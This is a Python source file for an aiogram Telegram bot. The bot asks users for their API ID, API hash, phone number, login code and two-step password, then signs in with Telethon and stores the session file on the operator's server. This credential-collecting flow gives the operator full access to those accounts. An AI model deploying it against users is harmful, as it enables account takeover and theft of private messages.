import logging
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from aiogram import types, Dispatcher
from aiogram.filters import Command

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_clients = {}  # Store active user clients

async def start_session(message: types.Message):
    """
    Start a session for a user.
    """
    await message.answer("Enter your Telegram API ID:")
    user_clients[message.from_user.id] = {'stage': 'awaiting_api_id'}

async def receive_api_id(message: types.Message):
    """
    Receive API ID and ask for API Hash.
    """
    user_clients[message.from_user.id]['api_id'] = message.text.strip()
    user_clients[message.from_user.id]['stage'] = 'awaiting_api_hash'
    await message.answer("Enter your Telegram API Hash:")

async def receive_api_hash(message: types.Message):
    """
    Receive API Hash and ask for phone number.
    """
    user_clients[message.from_user.id]['api_hash'] = message.text.strip()
    user_clients[message.from_user.id]['stage'] = 'awaiting_phone'
    await message.answer("Enter your phone number (with country code):")

async def receive_phone_number(message: types.Message):
    """
    Receive phone number and initiate session creation.
    """
    user_data = user_clients[message.from_user.id]
    phone_number = message.text.strip()

    api_id = int(user_data['api_id'])
    api_hash = user_data['api_hash']
    client = TelegramClient(f"sessions/{message.from_user.id}", api_id, api_hash)
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone_number)
            user_clients[message.from_user.id].update({'client': client, 'phone': phone_number, 'stage': 'awaiting_code'})
            await message.answer("Enter the code you received via Telegram:")
        else:
            user_clients[message.from_user.id]['client'] = client
            await message.answer("Session started successfully!")
    except Exception as e:
        logger.error(f"Error during session setup: {e}")
        await message.answer("An error occurred. Please try again later.")

async def receive_code(message: types.Message):
    """
    Receive authorization code and complete the session setup.
    """
    code = message.text.strip()
    user_data = user_clients[message.from_user.id]
    client = user_data['client']
    phone = user_data['phone']
    
    try:
        await client.sign_in(phone, code)
        await message.answer("Session authorized successfully!")
        user_clients[message.from_user.id]['stage'] = 'authorized'
    except SessionPasswordNeededError:
        user_clients[message.from_user.id]['stage'] = 'awaiting_password'
        await message.answer("Two-step verification is enabled. Enter your password:")
    except Exception as e:
        logger.error(f"Error during sign-in: {e}")
        await message.answer("An error occurred. Please try again later.")

async def receive_password(message: types.Message):
    """
    Receive password for two-step verification.
    """
    password = message.text.strip()
    user_data = user_clients[message.from_user.id]
    client = user_data['client']
    
    try:
        await client.sign_in(password=password)
        await message.answer("Session authorized successfully!")
        user_clients[message.from_user.id]['stage'] = 'authorized'
    except Exception as e:
        logger.error(f"Error during password authentication: {e}")
        await message.answer("An error occurred. Please try again later.")

def register_handlers(dp: Dispatcher):
    dp.message.register(start_session, Command("start_session"))
    dp.message.register(receive_api_id, lambda message: user_clients.get(message.from_user.id, {}).get('stage') == 'awaiting_api_id')
    dp.message.register(receive_api_hash, lambda message: user_clients.get(message.from_user.id, {}).get('stage') == 'awaiting_api_hash')
    dp.message.register(receive_phone_number, lambda message: user_clients.get(message.from_user.id, {}).get('stage') == 'awaiting_phone')
    dp.message.register(receive_code, lambda message: user_clients.get(message.from_user.id, {}).get('stage') == 'awaiting_code')
    dp.message.register(receive_password, lambda message: user_clients.get(message.from_user.id, {}).get('stage') == 'awaiting_password')
